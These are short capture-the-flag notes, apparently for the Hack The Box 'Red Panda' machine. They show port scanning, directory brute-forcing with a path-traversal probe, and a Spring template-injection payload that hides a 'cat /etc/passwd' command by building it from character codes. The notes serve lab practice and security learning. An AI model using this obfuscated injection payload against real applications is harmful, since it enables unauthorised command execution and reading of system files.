# Red Panda

[Link]

[Solution](https://www.youtube.com/watch?v=8uatXyKmb9c)


Goal: Server Side Template Injection (SSTI) on Spring Boot application

[sst-payload.py](https://github.com/VikasVarshney/ssti-payload)



1. nmap -sV -sC 10.10.11.170

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
```

Lorsqu'on voit http-proxy, try url name with port number

2. dirsearch

```
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://redpanda.htb:8080
python3 dirsearch.py  -u http://redpanda.htb:8080/
wfuzz -c --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt http://redpanda.htb:8080/FUZZ

Target: http://redpanda.htb:8080/

[15:27:50] Starting: 
[15:28:00] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[15:28:01] 400 -  435B  - /a%5c.aspx
[15:28:24] 500 -   86B  - /error
[15:28:24] 500 -   86B  - /error/
[15:28:47] 405 -  117B  - /search
[15:28:51] 200 -  987B  - /stats
[15:28:51] 200 -  987B  - /stats/

```

3. Perform SSTI 

Search for `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`

```

```


